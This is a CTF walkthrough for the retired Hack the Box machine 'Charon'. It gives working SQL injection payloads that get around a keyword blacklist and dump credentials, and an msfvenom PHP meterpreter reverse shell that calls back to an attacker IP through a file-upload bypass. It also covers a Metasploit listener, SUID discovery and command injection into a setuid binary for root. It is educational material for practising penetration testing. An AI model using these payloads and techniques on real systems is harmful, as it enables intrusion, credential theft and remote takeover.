<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/hackthebox/" rel="category tag">HackTheBox</a></span>            </div>
            <h1 class="post-title entry-title">Hack the Box Challenge: Charon Walkthrough</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/hack-the-box-challenge-charon-walkthrough/" rel="bookmark"><time class="entry-date published" datetime="2018-07-13T11:42:40+00:00">July 13, 2018</time><time class="updated" datetime="2025-07-05T17:10:37+00:00">July 5, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p><span style="color: #000000;">Hello friends!! Today we are going to solve another CTF challenge “Charon” which is available online for those who want to increase their skill in penetration testing and black box testing. Charon is retired vulnerable lab presented by <strong>Hack the Box</strong> for making online penetration practices according to your experience level; they have the collection of vulnerable labs as challenges from beginners to Expert level.</span></p>
<p><span style="color: #000000;"><strong>Level:</strong> Expert</span></p>
<h5><span style="color: #000000;">Task: find user.txt and root.txt file on victim’s machine.</span></h5>
<p><span style="color: #000000;">Since these labs are online available therefore they have static IP and IP of sense is <strong>10.10.10.31</strong> so let’s begin with nmap port enumeration.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">nmap -sV 10.10.10.31</pre>
<p><span style="color: #000000;"><img decoding="async" src="//1.bp.blogspot.com/-EISqh43a6Vg/W0iH46Y8ynI/AAAAAAAAX5c/m58UzzFGe9QH8NQE7B2kqPUwFbdbx0qnwCLcBGAs/s1600/1.png"/></span></p>
<p><span style="color: #000000;">From given below image, you can observe we found port 22 and 80 are open on target system.</span></p>
<p><span style="color: #000000;">As port 80 is running http server we open the target machine’s ip address in our browser.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="//3.bp.blogspot.com/-ut4NBDbZ4C8/W0iH7RckMlI/AAAAAAAAX6A/HKzshOqJBngg8TxSgP_4mW5G7vSFkIyLgCLcBGAs/s1600/2.png"/></span></p>
<p><span style="color: #000000;">We run dirbuster on port 80, which reveals a directory entitled “cmsdata/”.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="//2.bp.blogspot.com/-2MvTwJ72F70/W0iH9W0QNVI/AAAAAAAAX6o/FW5Um8Q0pxsNjtXRzlcbL8jF1lYU8_zrgCLcBGAs/s1600/3.png"/></span></p>
<p><span style="color: #000000;">Then, we open the link, and are presented with a login page.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="//3.bp.blogspot.com/-NXn27p5HHjc/W0iH-wE7xEI/AAAAAAAAX7I/v1AZxNnWj-wjfu0tVRFMLs6F9mVigFEdwCLcBGAs/s1600/4.png"/></span></p>
<p><span style="color: #000000;">We don’t find anything on the login page, so we go to forgot password link.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="//1.bp.blogspot.com/-S-zQxZqMsoI/W0iH_v2xvAI/AAAAAAAAX7M/mAtioEzymUkZs9koZdRB_VvieyvObjrLQCLcBGAs/s1600/5.png"/></span></p>
<p><span style="color: #000000;">We capture the request of the page using burpsuite, and send it to repeater.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="//4.bp.blogspot.com/-rc69Qj1tfzc/W0iH__h_yVI/AAAAAAAAX7Q/JUZIYV6osBcD5BI0PfyEg5aFRT_I7QZTACLcBGAs/s1600/6.png"/></span></p>
<p><span style="color: #000000;">After sending the request to repeater, we try to enumerate if the site is vulnerable to SQL-injection. As soon as we add a quote at the end of our email id we get a database error.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="//2.bp.blogspot.com/-rNw4cF-ynco/W0iH_3yV9LI/AAAAAAAAX7U/w_IVeAzyzlsmK3MWVqACTv5-cAizO_v-gCLcBGAs/s1600/7.png"/></span></p>
<p><span style="color: #000000;">Now to confirm that the site is vulnerable to SQL-injection we use “– – “to comment the query and remove the error.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="//4.bp.blogspot.com/-Oqrf5tmZXO0/W0iIAN5hheI/AAAAAAAAX7Y/SNA_RUKrynouYVZVrUIoXuESn4lmgF_5gCLcBGAs/s1600/8.png"/></span></p>
<p><span style="color: #000000;">Now as we know the site is vulnerable to SQL injection, we try to exploit it. First we find the number of columns, to check the number of columns we use “ORDER BY” command to find the number of columns in the table. After find the number of columns we use “UNION SELECT” command to give the output column names with the respective numbers. As UNION and union is blacklisted, we use UNion for SQL-injection.</span></p>
<h5><span style="color: #000000;"><strong>‘UNion SELECT 1,2,3,4 — –</strong></span></h5>
<p><span style="color: #000000;"><img decoding="async" src="//1.bp.blogspot.com/-RS7ISFJ1qSI/W0iIAnu8paI/AAAAAAAAX7c/vYE9aDTWSKk2DfvZx2MQa0cklTpHtJQrACLcBGAs/s1600/9.png"/></span></p>
<p><span style="color: #000000;">We couldn’t run any commands in columns, but when we pass a string in column 4, we successfully ran our query.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="//3.bp.blogspot.com/-U06I5Fi4vIs/W0iH49WEswI/AAAAAAAAX5U/gjgDFGGHUvUjCbeSt6zkt1P37DZe7quFgCLcBGAs/s1600/10.png"/></span></p>
<p><span style="color: #000000;">Now we know how bypass the security using string, we first find the name of the database</span></p>
<pre class="lang:default decode:true">' UNion select 1,2,3,concat(database(), "@who.ami") -- -</pre>
<p><span style="color: #000000;"><img decoding="async" src="//2.bp.blogspot.com/-zd4e4ilL8ZE/W0iH47pVr-I/AAAAAAAAX5Y/DjCWc8XVsz4piSUllfvPRdEexF6IbRmLACLcBGAs/s1600/11.png"/></span></p>
<p><span style="color: #000000;">After finding the name of the database we find the table name in the database.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">' UNion select 1,2,3,concat(table_name, "@who.ami") FROM information_schema.tables where table_schema="supercms" limit 1,1 -- -</pre>
<p><span style="color: #000000;"><img decoding="async" src="//3.bp.blogspot.com/-HR8nsQLroCk/W0iH5s33_9I/AAAAAAAAX5g/gLwHrB9Hkx0DaInQwNDY0jjugxxySM-XACLcBGAs/s1600/12.png"/></span></p>
<p><span style="color: #000000;">Enumerating the tables in the database; we find two tables, one called license and another one called operators.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">' UNion select 1,2,3,concat(table_name, "@who.ami") FROM information_schema.tables where table_schema="supercms" limit 2,1 -- -</pre>
<p><span style="color: #000000;"><img decoding="async" src="//2.bp.blogspot.com/-HfjO4DJeXgk/W0iH547rKSI/AAAAAAAAX5k/eKP3qf0us1omUmrQ0C-gMgPLmwyt0iinACLcBGAs/s1600/13.png"/></span></p>
<p><span style="color: #000000;">After getting the names of the tables, we enumerate the columns. The license table doesn’t have any interesting columns but in the “operators” table we find a column called “__username_”.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">' UNion select 1,2,3,concat(column_name, "@who.ami") FROM information_schema.columns where table_name="operators" limit 1,1 -- -</pre>
<p><span style="color: #000000;"><img decoding="async" src="//4.bp.blogspot.com/-NlIGmXbzxao/W0iH5-5eA0I/AAAAAAAAX5o/W8hXWbUP_yYsS_LTuWm982II_kEG3sYAgCLcBGAs/s1600/14.png"/></span></p>
<p><span style="color: #000000;">After getting the “__username_” column we enumerate further and get a column called “__password_”.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">' UNion select 1,2,3,concat(column_name, "@who.ami") FROM information_schema.columns where table_name="operators" limit 2,1 -- -</pre>
<p><span style="color: #000000;"><img decoding="async" src="//2.bp.blogspot.com/-_3EhznS3wf8/W0iH6BcnWXI/AAAAAAAAX5s/DvVxPo-c7DkVQR34k3zZHGbLBzZjZjDxQCLcBGAs/s1600/15.png"/></span></p>
<p><span style="color: #000000;">Now we dump the column name “__username_”.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">' UNion select 1,2,3,concat(__username_, "@who.ami") FROM operators limit 1,1 -- -</pre>
<p><span style="color: #000000;"><img decoding="async" src="//3.bp.blogspot.com/-Eifw4DtEHuI/W0iH6E247oI/AAAAAAAAX5w/NveEux8C6PUREbgEObvxDeY_tpNjHuuMgCLcBGAs/s1600/16.png"/></span></p>
<p><span style="color: #000000;">Now we dump the column name “__password_” for the username = “super_cms_adm”.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">' UNion select 1,2,3,concat(__password_, “@who.ami”) FROM operators limit 1,1 -- -</pre>
<p><span style="color: #000000;"><img decoding="async" src="//4.bp.blogspot.com/-vOaI10WOvUU/W0iH6fl1ClI/AAAAAAAAX50/YtkMXBeY5kc1CscRiVaQU11uTVVOHokuQCLcBGAs/s1600/17.png"/></span></p>
<p><span style="color: #000000;">When we dump the “__password_” column we get a hash. We use hashkiller.co.uk to crack the password.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="//2.bp.blogspot.com/-zCbNDDasfqw/W0iH65ocrTI/AAAAAAAAX54/0pY-9F5LO2AkluDFad-i6VJDIxAhjpYfQCLcBGAs/s1600/18.png"/></span></p>
<p><span style="color: #000000;">Now we got the credentials for the supercms login page, <strong>super_cms_adm:tamarro</strong>.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-IFzFkiXSvuI/XLLjWIsSWZI/AAAAAAAAeAk/IC14dX2Ew4Y0LChmy7Qfo7aP-_9NtOYNQCLcBGAs/s1600/charon.png"/></span></p>
<p><span style="color: #000000;">Then, login using the above credentials, we were able to get a page where there is an option for uploading image.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="//2.bp.blogspot.com/-Xn-TuIiPJF4/W0iH7mcJ4iI/AAAAAAAAX6E/0BpFXZ8mSKMuPY0pbkA3ZU8--cqfDX7rwCLcBGAs/s1600/20.png"/></span></p>
<p><span style="color: #000000;">Now we open the link and find an upload page.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="//4.bp.blogspot.com/-iUvvwHrVE-0/W0iH79fwx6I/AAAAAAAAX6I/GJahX3_M0LEjDJiCVnOQEePsKJluDytfwCLcBGAs/s1600/21.png"/></span></p>
<p><span style="color: #000000;">We take a look at the source page and find a base64 encoded string.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="//2.bp.blogspot.com/-GDMnGL-5Cb4/W0iH8FoVxRI/AAAAAAAAX6M/8CXFXxLK4ysqBzS5hvP2zQLbKa1cp0HFwCLcBGAs/s1600/22.png"/></span></p>
<p><span style="color: #000000;">When we decode it we find a string called “testfile1”. It is possible that there is hidden field with this name.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="//3.bp.blogspot.com/-G2BuOZwHLYA/W0iH8Ii_O6I/AAAAAAAAX6Q/2LK8hopIdoclKJE1joOV9rPOnuFvGT1hwCLcBGAs/s1600/23.png"/></span></p>
<p><span style="color: #000000;">Now we create a php payload using msfvenom, so that we can upload our php shell.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">msfvenom -p php/meterpreter/reverse_tcp lhost=10.10.14.7 lport=4444 -f raw</pre>
<p><span style="color: #000000;"><img decoding="async" src="//1.bp.blogspot.com/-tnnkI_BlCf0/W0iH8b4TeCI/AAAAAAAAX6U/5LM_XtPOq8gi9vaieUdNZJH5r-lmD-geACLcBGAs/s1600/24.png"/></span></p>
<p><span style="color: #000000;">We capture the upload request and create a new field and add “file.php”.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="//2.bp.blogspot.com/-HodZVN989wk/W0iH8ePB-ZI/AAAAAAAAX6Y/JEpqPSp8iEMG09CkGzNAbBYIZz6nUdfvQCLcBGAs/s1600/25.png"/></span></p>
<p><span style="color: #000000;">Now we get the link the location of the file we just uploaded in /images/.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="//4.bp.blogspot.com/-FyGSvqFTjRU/W0iH89ypBFI/AAAAAAAAX6c/F9x-Osb-0iYbDZ8WrBTTS02aI6BLxl4EgCLcBGAs/s1600/26.png"/></span></p>
<p><span style="color: #000000;">Before running our shell, we setup our listener using metasploit.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">msf &gt; use exploit/multi/handler
msf exploit(multi/handler) &gt; set payload php/meterpreter/reverse_tcp
msf exploit(multi/handler) &gt; set lhost 10.10.14.7
msf exploit(multi/handler) &gt; set lport 4444
msf exploit(multi/handler) &gt; run</pre>
<p><span style="color: #000000;"><strong> <img decoding="async" src="//3.bp.blogspot.com/-oq-7iEYPmE0/W0iH82h80EI/AAAAAAAAX6g/y1acNwIOjx00kkg1EdUNQKAxSr6onMseQCLcBGAs/s1600/27.png"/></strong></span></p>
<p><span style="color: #000000;">As soon as we open the link to our shell, we get our reverse shell.</span></p>
<h5><span style="color: #000000;">meterpreter &gt; sysinfo</span></h5>
<p><span style="color: #000000;"><img decoding="async" src="//3.bp.blogspot.com/-X384AFyOjEg/W0iH9L0zYTI/AAAAAAAAX6k/-5XTT4QwEjQULai-HEqLHEUiBE52GsLAgCLcBGAs/s1600/28.png"/></span></p>
<p><span style="color: #000000;">Now enumerating through the system we find an encrytpted file and a public key inside /home/decoder directory.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="//3.bp.blogspot.com/-lbNFiRB16Mc/W0iH9kTJvwI/AAAAAAAAX6s/bV05c8hbU2kVHhfWn0qF_XjLY9KhsX94wCLcBGAs/s1600/30.png"/></span></p>
<p><span style="color: #000000;">We download both the files into our system.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">meterpreter &gt; download decoder.pub /root/Desktop
meterpreter &gt; download pass.crypt /root/Desktop</pre>
<p><span style="color: #000000;"><img decoding="async" src="//3.bp.blogspot.com/-Yy7GSlMloGw/W0iH9tkOnzI/AAAAAAAAX6w/hwkmV-28rCAq2S35huBoFIzelLydVkHDACLcBGAs/s1600/31.png"/></span></p>
<p><span style="color: #000000;">Now we decode the encrypted file using public key with the RsaCtfTool.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">./RsaCtfTool.py --publickey /root/Desktop/decoder.pub –uncipherfile /root/Desktop/pass.crypt</pre>
<p><span style="color: #000000;"><img decoding="async" src="//1.bp.blogspot.com/-2Bo3gfoKLoI/W0iH916Z2WI/AAAAAAAAX60/PD2pYCxpDL05mc_yV8veEoV0zo6Urx7CwCLcBGAs/s1600/34.png"/></span></p>
<p><span style="color: #000000;">We use ssh to login using the credentials, <strong>decoder:nevermindthebollocks.</strong></span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">ssh decoder@10.10.10.31</pre>
<p><span style="color: #000000;"><img decoding="async" src="//4.bp.blogspot.com/-Dc0Bk8qds1U/W0iH-OCpFDI/AAAAAAAAX64/0XB3BsGJ3I0Wss82YKRYFsc6PtFqfLdaACLcBGAs/s1600/35.png"/></span></p>
<p><span style="color: #000000;">After logging in we find a file called user.txt, we open the file and find our first flag.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="//2.bp.blogspot.com/-Wdh7Z1uzPh4/W0iH-ZY87_I/AAAAAAAAX68/ynP2NfavxHIePtAgK9ERq78i7IFDHIGmwCLcBGAs/s1600/36.png"/></span></p>
<p><span style="color: #000000;">Now we find the files with SUID bit set and find a file called supershell in /usr/local/bin/ directory.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">find / -perm -4000 2&gt;/dev/null</pre>
<p><span style="color: #000000;"><img decoding="async" src="//4.bp.blogspot.com/-fD_RqNcb_R0/W0iH-gLwPKI/AAAAAAAAX7A/Xwpk_XvBCisiRgC1rVu5tj-CrAWrP7cdACLcBGAs/s1600/37.png"/></span></p>
<p><span style="color: #000000;">When we run the binary we find that we can run any shell command using this binary. We use this to open root.txt inside /root/ directory. When we open root.txt we find our final flag.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">supershell "/bin/ls$
&gt; cat /root/root.txt"</pre>
<p><span style="color: #000000;"><img decoding="async" src="//2.bp.blogspot.com/-05MgnNoIQQA/W0iH-qUJEaI/AAAAAAAAX7E/iXKxR0Obr28AjMIA4SYUcgfvwAKqSAMaACLcBGAs/s1600/38.png"/></span></p>
<p><span style="color: #000000;">Thank you for giving your precious time to read this walkthrough. If you want to read more HTB Write-ups. Follow this</span> <strong><a href="https://www.hackingarticles.in/category/ctf-challenges/hackthebox/">Link.</a></strong> <span style="color: #000000;">Happy Hacking!</span></p>
<p><span style="color: #000000;"><strong>Author</strong>: Sayantan Bera is a technical writer at hacking articles and cyber security enthusiast. Contact <a style="color: #000000;" href="//www.linkedin.com/in/sayantan-bera-2098a613b/"><strong>Here</strong></a></span></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
